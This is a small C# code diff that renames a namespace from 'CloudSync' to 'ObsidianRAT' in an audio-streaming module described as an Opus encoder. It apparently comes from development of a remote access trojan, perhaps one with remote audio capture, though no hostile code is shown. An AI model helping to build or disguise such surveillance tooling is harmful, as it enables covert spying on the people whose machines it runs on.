@@ -2,7 +2,7 @@
 using Concentus.Structs;
 using Concentus.Enums;
 
-namespace CloudSync.Services.Modules.Stream.Sound
+namespace ObsidianRAT.Services.Modules.Stream.Sound
 {
     /// <summary>
     /// Opus audio encoder using Concentus (pure managed C# Opus implementation).
